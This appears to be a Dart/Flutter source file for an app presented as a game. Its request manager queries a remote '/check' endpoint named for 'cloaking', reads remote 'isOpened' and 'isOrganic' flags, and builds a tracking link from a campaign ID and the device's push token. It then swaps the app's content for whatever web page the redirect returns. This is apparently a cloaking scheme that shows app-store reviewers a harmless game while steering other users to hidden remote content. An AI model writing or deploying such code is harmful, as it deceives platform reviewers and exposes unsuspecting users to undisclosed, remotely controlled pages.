import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:firebase_app_installations/firebase_app_installations.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/cupertino.dart';
import 'package:http/http.dart' as http;
import '/controller/player_controller.dart';
import '/data/parameters_model.dart';
import '/data/track_model.dart';
import '/pages/game_fragment.dart';
import '/utils/consts.dart';

class RequestManager {
  PlayerController playerController;

  RequestManager(this.playerController);
  final Future<FirebaseApp> _fApp = Firebase.initializeApp();

  Future<bool?> requestToCloackIt() async {
    try {
      // String agent = await Consts.CHANNEL_AGENT.invokeMethod('getUserAgent');

      Map<String, String> headers = {
        "User-Agent": "",
        "referer": Consts.package,
      };

      var link = Uri.parse("${Consts.link}/check");
      final response = await http.get(link, headers: headers);
      if (response.statusCode == 200) {
        bool isOpen = response.body.toLowerCase() == 'true';
        return isOpen;
      } else {
        return null;
      }
    } on Exception {
      return null;
    }
  }

  Future<bool> isOpen() async {
    Completer<bool> completer = Completer();
    try {
      DatabaseReference _refDb =
          FirebaseDatabase.instance.ref().child('isOpened');
      _refDb.onValue.listen((event) {
        var result = event.snapshot.value as bool;
        completer.complete(result);
      });
      return completer.future;
      // return await Consts.IS_OPEN.invokeMethod("getIsOpenStatus") as bool;
    } on Exception {
      return false;
    }
  }

  Future<bool> getOrganicStatus() async {
    Completer<bool> completer = Completer();
    try {
      DatabaseReference _refDb =
          FirebaseDatabase.instance.ref().child('isOrganic');
      _refDb.onValue.listen((event) {
        var result = event.snapshot.value as bool;
        completer.complete(result);
      });
      return completer.future;
      // return await Consts.GET_OSTATUS.invokeMethod("getOStatus") as bool;
    } on Exception {
      return false;
    }
  }

  bool checkUser(bool cloack, bool organic) {
    return cloack && organic;
  }

  Future<List<String>?> getKeysList() async {
    try {
      var link = Uri.parse("${Consts.link}/keys");
      final response = await http.get(link);
      if (response.statusCode == 200) {
        var data = response.body.toString();
        var json = jsonDecode(data);

        return (json['keys'] as List<dynamic>).cast<String>();
      } else {
        return null;
      }
    } on Exception {
      return null;
    }
  }

  Future<TrackModel?> getLinkDomain() async {
    try {
      var link = Uri.parse("${Consts.link}/track");
      final respose = await http.get(link);
      if (respose.statusCode == 200) {
        var data = respose.body.toString();
        var json = jsonDecode(data);
        var domain = json['domain'] as String;
        var campaignId = json['campaignId'] as String;
        return TrackModel(domain, campaignId);
      } else {
        return null;
      }
    } on Exception {
      return null;
    }
  }

  Future<ParametersModel?> getParameters() async {
    try {
      var link = Uri.parse("${Consts.link}/track/parameters");
      final response = await http.get(link);
      if (response.statusCode == 200) {
        var data = response.body.toString();
        var json = jsonDecode(data);
        var auth = json["auth"] as String;
        var authKey = json["auth_key"] as String;
        var appId = json["ap_id"] as String;
        var accessToken = json["access_token"] as String;
        return ParametersModel(auth, authKey, appId, accessToken);
      } else {
        return null;
      }
    } on Exception {
      return null;
    }
  }

  Future<String?> getUrlLocation(String url) async {
    final client = HttpClient();
    var uri = Uri.parse(url);
    var request = await client.getUrl(uri);
    request.followRedirects = false;
    var response = await request.close();
    return response.headers.value(HttpHeaders.locationHeader);
  }

  Future makeTrackLink(
      TrackModel trackModel, ParametersModel parametersModel) async {
    var uuid = await _getUUID() ?? "";

    var makeLink =
        "${trackModel.domain}${trackModel.campaignId}?sub1=${Consts.package}&uuid=${uuid}&auth_key=${parametersModel.authKey}";

    final response = await getUrlLocation(makeLink);
    try {
      if (response != null) {
        saveLink(response);
        runApp(GameFragment(response, playerController));
      }
    } on Exception {}
  }

  Future<String?> _getUUID() async {
    final FirebaseMessaging _firebaseMessaging = FirebaseMessaging.instance;
    var installations = FirebaseInstallations.instance;
    String installationsId = await installations.getId();
    await _firebaseMessaging.requestPermission();

    var token = "none";
    try {
      token = await _firebaseMessaging.getToken() ?? "none";
    } catch (e) {
      token = "none";
    }
    return token;
  }

  void reject() {
    playerController.savePlayer(true);
  }

  void saveKeys(List<String> keys) {
    playerController.saveKeys(keys);
  }

  void saveLink(String link) {
    playerController.saveLink(link);
  }

  String? getLink() {
    return playerController.getLink();
  }
}
